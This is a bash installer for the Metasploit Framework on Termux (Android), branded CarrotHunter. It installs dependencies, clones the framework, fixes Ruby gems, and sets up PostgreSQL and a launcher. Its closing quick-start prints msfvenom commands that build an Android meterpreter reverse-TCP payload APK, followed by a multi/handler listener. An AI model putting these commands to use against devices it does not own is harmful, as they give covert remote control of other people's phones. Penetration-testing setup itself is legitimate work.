#!/data/data/com.termux/files/usr/bin/bash
# metasploit.sh
# CarrotHunter - Metasploit Installer for Termux
# Optimized, Stable & Lightweight

# =============================================
# CONFIGURATION
# =============================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m'

# =============================================
# BANNER
# =============================================

show_banner() {
    clear
    echo -e "${BLUE}"
    cat << "EOF"
   ███╗   ███╗███████╗████████╗ █████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗
   ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
   ██╔████╔██║█████╗     ██║   ███████║███████╗██████╔╝██║     ██║   ██║██║   ██║   
   ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
   ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║███████║██║     ███████╗╚██████╔╝██║   ██║   
   ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}              Metasploit Installer${NC}"
    echo -e "${CYAN}    For CarrotHunter - Termux Edition${NC}"
    echo ""
    echo -e "${MAGENTA}═══════════════════════════════════════════════${NC}"
    echo ""
}

# =============================================
# LOGGING
# =============================================

log_info()  { echo -e "${CYAN}[*]${NC} $1"; }
log_ok()    { echo -e "${GREEN}[✓]${NC} $1"; }
log_warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[✗]${NC} $1"; }
log_step()  { echo -e "\n${MAGENTA}▶ $1${NC}"; }

# =============================================
# CHECK TERMUX
# =============================================

check_termux() {
    if [ ! -d "/data/data/com.termux" ]; then
        log_error "This script must be run inside Termux"
        exit 1
    fi
    log_ok "Termux detected"
}

# =============================================
# STEP 1: UPDATE PACKAGES
# =============================================

update_packages() {
    log_step "STEP 1/8: Updating Package Lists"
    
    if ! pkg update -y 2>/dev/null; then
        log_warn "Update failed, trying mirror change..."
        termux-change-repo
        pkg update -y
    fi
    
    log_ok "Package lists updated"
}

# =============================================
# STEP 2: INSTALL DEPENDENCIES
# =============================================

install_dependencies() {
    log_step "STEP 2/8: Installing Dependencies"
    
    DEPS=(
        "binutils"
        "python"
        "python-pip"
        "autoconf"
        "bison"
        "clang"
        "coreutils"
        "curl"
        "findutils"
        "apr"
        "apr-util"
        "postgresql"
        "openssl"
        "readline"
        "libffi"
        "libgmp"
        "libpcap"
        "libsqlite"
        "libgrpc"
        "libtool"
        "libxml2"
        "libxslt"
        "ncurses"
        "ncurses-utils"
        "git"
        "wget"
        "unzip"
        "zip"
        "tar"
        "termux-tools"
        "termux-elf-cleaner"
        "pkg-config"
        "ruby"
        "make"
        "which"
    )
    
    for dep in "${DEPS[@]}"; do
        if ! pkg list-installed 2>/dev/null | grep -q "^$dep/"; then
            log_info "Installing $dep..."
            pkg install -y "$dep" -o Dpkg::Options::="--force-confnew" 2>/dev/null || {
                log_warn "Failed to install $dep (may already exist)"
            }
        fi
    done
    
    # Python requests
    python3 -m pip install requests 2>/dev/null || true
    
    log_ok "Dependencies installed"
}

# =============================================
# STEP 3: CLEAN OLD INSTALLATION
# =============================================

clean_old() {
    log_step "STEP 3/8: Cleaning Old Installation"
    
    if [ -d "${PREFIX}/opt/metasploit-framework" ]; then
        log_info "Removing old Metasploit..."
        rm -rf "${PREFIX}/opt/metasploit-framework"
        log_ok "Old installation removed"
    else
        log_ok "No old installation found"
    fi
    
    # Clean gem cache
    rm -rf ~/.gem 2>/dev/null || true
    rm -rf $PREFIX/lib/ruby/gems/*/cache/*.gem 2>/dev/null || true
    
    log_ok "Cache cleaned"
}

# =============================================
# STEP 4: DOWNLOAD METASPLOIT
# =============================================

download_metasploit() {
    log_step "STEP 4/8: Downloading Metasploit Framework"
    
    if [ ! -d "${PREFIX}/opt" ]; then
        mkdir -p "${PREFIX}/opt"
    fi
    
    cd "${PREFIX}/opt"
    
    log_info "Cloning Metasploit (this may take a few minutes)..."
    
    if ! git clone https://github.com/rapid7/metasploit-framework.git --depth=1 metasploit-framework 2>/dev/null; then
        log_error "Failed to download Metasploit"
        log_info "Check your internet connection and try again"
        exit 1
    fi
    
    log_ok "Metasploit downloaded"
    cd "${PREFIX}/opt/metasploit-framework"
}

# =============================================
# STEP 5: INSTALL RUBY GEMS
# =============================================

install_ruby_gems() {
    log_step "STEP 5/8: Installing Ruby Gems"
    
    cd "${PREFIX}/opt/metasploit-framework"
    
    # Install bundler
    log_info "Installing bundler..."
    gem install bundler 2>/dev/null || true
    log_ok "Bundler installed"
    
    # Fix Nokogiri for Termux
    log_info "Installing Nokogiri (may take a few minutes)..."
    
    NOKOGIRI_VERSION=$(grep -i nokogiri Gemfile.lock 2>/dev/null | head -1 | sed 's/nokogiri [\(\)]/(/g' | cut -d ' ' -f 5 | grep -oP "[\d.]+" | head -1)
    
    if [ -z "$NOKOGIRI_VERSION" ]; then
        NOKOGIRI_VERSION="1.18.10"
    fi
    
    gem install nokogiri -v "$NOKOGIRI_VERSION" -- \
        --with-cflags="-Wno-implicit-function-declaration -Wno-deprecated-declarations -Wno-incompatible-function-pointer-types" \
        --use-system-libraries 2>/dev/null || {
        log_warn "Nokogiri v$NOKOGIRI_VERSION failed, trying default..."
        gem install nokogiri -- \
            --with-cflags="-Wno-implicit-function-declaration -Wno-deprecated-declarations -Wno-incompatible-function-pointer-types" \
            --use-system-libraries 2>/dev/null || {
            log_error "Nokogiri installation failed"
        }
    }
    
    log_ok "Nokogiri installed"
    
    # Install actionpack
    log_info "Installing actionpack..."
    gem install actionpack 2>/dev/null || true
    
    # Run bundle install
    log_info "Running bundle install (this may take a while)..."
    bundle install 2>&1 | tail -3
    
    log_ok "Ruby gems installed"
}

# =============================================
# STEP 6: FIX COMPATIBILITY
# =============================================

fix_compatibility() {
    log_step "STEP 6/8: Fixing Compatibility Issues"
    
    cd "${PREFIX}/opt/metasploit-framework"
    
    # Fix ActionView version check for ARM64
    if [ -f "config/application.rb" ]; then
        log_info "Patching ActionView compatibility..."
        sed -i 's/raise unless ActionView::VERSION::STRING == .*$/# Version check disabled for ARM64 compatibility/' config/application.rb 2>/dev/null || true
    fi
    
    # Fix pg gem
    if ls ${PREFIX}/lib/ruby/gems/*/gems/pg-*/lib/pg_ext.so 2>/dev/null; then
        log_info "Fixing pg gem..."
        termux-elf-cleaner ${PREFIX}/lib/ruby/gems/*/gems/pg-*/lib/pg_ext.so 2>/dev/null || true
    fi
    
    log_ok "Compatibility fixes applied"
}

# =============================================
# STEP 7: LINK EXECUTABLES
# =============================================

link_executables() {
    log_step "STEP 7/8: Linking Executables"
    
    MSF_DIR="${PREFIX}/opt/metasploit-framework"
    
    # Link executables
    ln -sf "${MSF_DIR}/msfconsole" "${PREFIX}/bin/msfconsole" 2>/dev/null || true
    ln -sf "${MSF_DIR}/msfvenom" "${PREFIX}/bin/msfvenom" 2>/dev/null || true
    ln -sf "${MSF_DIR}/msfrpcd" "${PREFIX}/bin/msfrpcd" 2>/dev/null || true
    ln -sf "${MSF_DIR}/msfdb" "${PREFIX}/bin/msfdb" 2>/dev/null || true
    
    log_ok "Executables linked"
    
    # Create launcher
    log_info "Creating launcher script..."
    
    cat > "${PREFIX}/bin/carrot-msf" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
# CarrotHunter Metasploit Launcher

# Start PostgreSQL if not running
if ! pg_ctl -D $PREFIX/var/lib/postgresql status >/dev/null 2>&1; then
    echo "[*] Starting PostgreSQL..."
    pg_ctl -D $PREFIX/var/lib/postgresql start >/dev/null 2>&1
    sleep 2
fi

# Launch msfconsole
exec $PREFIX/opt/metasploit-framework/msfconsole "$@"
EOF
    
    chmod +x "${PREFIX}/bin/carrot-msf"
    log_ok "Launcher created: carrot-msf"
}

# =============================================
# STEP 8: SETUP DATABASE
# =============================================

setup_database() {
    log_step "STEP 8/8: Setting Up Database"
    
    # Initialize PostgreSQL
    if [ ! -d "${PREFIX}/var/lib/postgresql" ]; then
        log_info "Initializing PostgreSQL..."
        initdb "${PREFIX}/var/lib/postgresql" 2>/dev/null || true
    fi
    
    # Start PostgreSQL
    log_info "Starting PostgreSQL..."
    pg_ctl -D "${PREFIX}/var/lib/postgresql" start 2>/dev/null || true
    sleep 3
    
    # Create database
    createuser -s msf 2>/dev/null || true
    createdb msf_database 2>/dev/null || true
    
    log_ok "Database configured"
}

# =============================================
# VERIFY INSTALLATION
# =============================================

verify_installation() {
    log_step "VERIFICATION"
    
    echo ""
    echo -e "${CYAN}  Installation Check:${NC}"
    echo -e "${CYAN}  ─────────────────────────────────────${NC}"
    
    # Check msfconsole
    if [ -f "${PREFIX}/opt/metasploit-framework/msfconsole" ]; then
        log_ok "msfconsole found"
    else
        log_error "msfconsole NOT found"
    fi
    
    # Check msfvenom
    if [ -f "${PREFIX}/opt/metasploit-framework/msfvenom" ]; then
        log_ok "msfvenom found"
    else
        log_error "msfvenom NOT found"
    fi
    
    # Check Ruby
    if command -v ruby &>/dev/null; then
        log_ok "Ruby: $(ruby -v | cut -d' ' -f2)"
    else
        log_warn "Ruby not found"
    fi
    
    # Check PostgreSQL
    if command -v psql &>/dev/null; then
        log_ok "PostgreSQL: $(psql --version | cut -d' ' -f3)"
    else
        log_warn "PostgreSQL not found"
    fi
    
    # Check symlinks
    if [ -L "${PREFIX}/bin/msfconsole" ]; then
        log_ok "msfconsole symlink"
    else
        log_warn "msfconsole symlink missing"
    fi
    
    if [ -L "${PREFIX}/bin/msfvenom" ]; then
        log_ok "msfvenom symlink"
    else
        log_warn "msfvenom symlink missing"
    fi
}

# =============================================
# FINAL MESSAGE
# =============================================

show_completion() {
    echo ""
    echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
    echo -e "${GREEN}      METASPLOIT INSTALLED SUCCESSFULLY${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${CYAN}  🎯 Quick Start:${NC}"
    echo -e "${CYAN}  ─────────────────────────────────────${NC}"
    echo ""
    echo -e "${WHITE}  1. Launch Metasploit:${NC}"
    echo -e "     ${GREEN}carrot-msf${NC}"
    echo -e "     ${GREEN}msfconsole${NC}"
    echo ""
    echo -e "${WHITE}  2. Generate Android Payload:${NC}"
    echo -e "     ${GREEN}msfvenom -p android/meterpreter/reverse_tcp \\\\${NC}"
    echo -e "     ${GREEN}  LHOST=YOUR_IP LPORT=4444 -o payload.apk${NC}"
    echo ""
    echo -e "${WHITE}  3. Start Listener:${NC}"
    echo -e "     ${GREEN}msfconsole -q -x \"use exploit/multi/handler; \\\\${NC}"
    echo -e "     ${GREEN}  set payload android/meterpreter/reverse_tcp; \\\\${NC}"
    echo -e "     ${GREEN}  set LHOST YOUR_IP; set LPORT 4444; exploit\"${NC}"
    echo ""
    echo -e "${YELLOW}  [⚠] Ethical Warning:${NC}"
    echo -e "${YELLOW}  ─────────────────────────────────────${NC}"
    echo -e "${YELLOW}  Use ONLY in isolated lab environment.${NC}"
    echo -e "${YELLOW}  Never target systems you don't own.${NC}"
    echo ""
    echo -e "${MAGENTA}═══════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  Ready to hunt! 🥕${NC}"
    echo -e "${MAGENTA}═══════════════════════════════════════════════${NC}"
    echo ""
}

# =============================================
# MAIN
# =============================================

main() {
    show_banner
    check_termux
    
    update_packages
    install_dependencies
    clean_old
    download_metasploit
    install_ruby_gems
    fix_compatibility
    link_executables
    setup_database
    
    verify_installation
    show_completion
}

# Handle Ctrl+C
trap 'echo -e "\n${YELLOW}[!] Installation interrupted${NC}"; exit 1' INT

# Run
main